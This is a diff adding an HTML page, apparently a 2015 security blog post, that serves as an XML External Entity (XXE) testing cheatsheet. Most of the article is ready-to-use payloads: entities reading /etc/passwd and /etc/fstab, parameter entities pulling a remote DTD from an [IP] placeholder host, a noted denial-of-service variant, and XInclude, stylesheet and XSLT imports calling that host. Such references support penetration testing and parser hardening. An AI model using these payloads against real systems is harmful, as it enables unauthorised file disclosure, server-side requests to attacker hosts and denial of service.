@@ -1,0 +1,247 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>XML Entity Cheatsheet - Updated - Silent Robot Systems</title>
+  <meta name="author" content="Willis Vandevanter">
+
+  
+  <meta name="description" content="XML Entity Cheatsheet - Updated An XML Entity testing cheatsheet. This is an updated version with nokogiri tests removed, just (X)XE notes. XML &hellip;">
+  
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.silentrobots.com/blog/2015/12/14/xe-cheatsheet-update">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/styles.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Silent Robot Systems" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <script src="/javascripts/jquery.sidr.min.js"></script>
+  <script src="/javascripts/ah-blue.js"></script>
+  
+</head> 
+
+<body   >
+  <div class="aux-container">
+    <a id="nav-toggle" href="#sidr"></a>
+    <a id="search-toggle"></a>
+</div>
+
+<!--
+<header class="header-container clearfix">
+        <a href="/"><img src="/images/srs_head.png" height=200 width=200 align=right></a>
+</header>
+-->
+
+
+  <div class="main-container">
+    <div class="main wrapper clearfix">
+    	
+    	<aside>
+			
+			  	<div class="search-container">
+					<br>
+					<center><a href="/"><img src="/images/srs_head.png" height=200 width=200></a></center>
+					<br>
+					<div id="main-nav">
+    <nav>
+        <ul>
+        	<li>
+        		
+					<h3>Recent Posts</h3>
+<ul>
+	
+    <li>
+    	<a href="/blog/2015/12/14/xe-cheatsheet-update/">XML Entity Cheatsheet - Updated</a>
+    </li>
+    
+    <li>
+    	<a href="/blog/2015/09/10/blackhat-2015-arsenal/">Blackhat 2015 Arsenal</a>
+    </li>
+    
+    <li>
+    	<a href="/blog/2015/04/13/simple_ruby_exec/">Simple Ruby Exec with Open and Pipe</a>
+    </li>
+    
+    <li>
+    	<a href="/blog/2015/03/04/oxml_xxe/">Exploiting XXE Vulnerabilities in OXML Documents - Part 1</a>
+    </li>
+    
+    <li>
+    	<a href="/blog/2015/02/25/ldapsearch_notes/">ldapsearch notes</a>
+    </li>
+    
+</ul>
+
+				
+        	</li>
+        	<li>
+        		<ul>
+                    <li><a href="/about" target="_blank">About</a>
+                    <li><a href="/projects" target="_blank">Projects</a>
+        		</ul>
+        	</li>
+        	<li>
+        		<ul>
+        			<li>Github - <a href="http://www.github.com/BuffaloWill" target="_blank">github.com/BuffaloWill</a></li>
+                    <li>Twitter - <a href="http://www.twitter.com/_will_is_" target="_blank">@_will_is_</a></li>
+                    <li>Email - <a href="" target="_blank">will _at_ silentrobots.com</a></li>
+        		</ul>
+        	</li>
+        </ul>
+    </nav>
+</div>
+
+					<br><br><br>
+				</div>
+			
+		</aside>
+		
+		<br><br><br><br>
+      <div>
+<article>
+	<header>
+  <div class="article-tags">
+      
+
+
+  </div>
+  
+    <h1>
+      XML Entity Cheatsheet - Updated
+    </h1>
+  
+</header>
+
+  <section><p>An XML Entity testing cheatsheet. This is an updated version with nokogiri tests removed, just (X)XE notes.</p>
+
+<!-- more -->
+
+
+<p>XML Headers:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml version="1.0" standalone="no"?&gt;
+</span><span class='line'>&lt;?xml version="1.0" standalone="yes"?&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Vanilla entity test:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post "1"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>SYSTEM entity test (xxe):</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "file:///etc/passwd"&gt;]&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Parameter Entity. One of the benefits is a paremeter entity is automatically expanded inside the DOCTYPE:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;%dtd]&gt;
+</span><span class='line'>
+</span><span class='line'>Should be illegal per XML specs but I've seen it work, also useful for DoS:
+</span><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Combined Entity and Parameter Entity:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY post SYSTEM "http://"&gt;&lt;!ENTITY % dtd SYSTEM "http://[IP]/some.dtd"&gt;&lt;!ENTITY % a "test %dtd"&gt;]&gt;&lt;root&gt;&post;&lt;/root&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>URL handler. This follows <del><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity - IBM (Broken)</a></del> I have not used this but Public DTD works just as well:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE root [&lt;!ENTITY c PUBLIC "-//W3C//TEXT copyright//EN" "http://[IP]/copyright.xml"&gt;]&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>XML Schema Inline:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;madeuptag xlmns="http://[ip]" xsi:schemaLocation="http://[IP]"&gt;
+</span><span class='line'>&lt;/madeuptag&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Remote Public DTD, from <u><a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe payloads</a></u>:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "http://[IP]"&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>External XML Stylesheet, from <u><a href="http://releases.portswigger.net/2015/08/1625.html">Burp Suite Release Notes</a></u>:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml-stylesheet type="text/xml" href="http://[IP]"?&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>XInclude:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;document xmlns:xi="http://&lt;IP&gt;/XInclude"&gt;&lt;footer&gt;&lt;xi:include href="title.xml"/&gt;&lt;/footer&gt;&lt;/document&gt;
+</span><span class='line'>&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+</span><span class='line'>&lt;xi:include href="file:///etc/fstab" parse="text"/&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Inline XSLT:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?xml-stylesheet type="text/xml" href="#mytest"?&gt;
+</span><span class='line'>&lt;xsl:stylesheet id="mytest" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:fo="http://www.w3.org/1999/XSL/Format"&gt;
+</span><span class='line'>&lt;!-- replace with your XSLT attacks --&gt;
+</span><span class='line'>&lt;xsl:import href="http://[ip]"/&gt;
+</span><span class='line'>&lt;xsl:template match="id('boom')"&gt;
+</span><span class='line'>  &lt;fo:block font-weight="bold"&gt;&lt;xsl:apply-templates/&gt;&lt;/fo:block&gt;
+</span><span class='line'>&lt;/xsl:template&gt;
+</span><span class='line'>&lt;/xsl:stylesheet&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Useful Links:</p>
+
+<ul>
+<li><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf">XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques</a></li>
+<li><a href="http://publib.boulder.ibm.com/infocenter/wsadhelp/v5r1m2/topic/com.ibm.etools.xmlbuilder.doc/topics/cxmlcat.html">XML Entity Examples - IBM (Broken, check Internet Archive)</a></li>
+</ul>
+
+</section>
+
+
+
+	
+</article>
+</div>
+
+    </div>
+  </div>
+  
+
+
+  
+
+</body>
+</html>
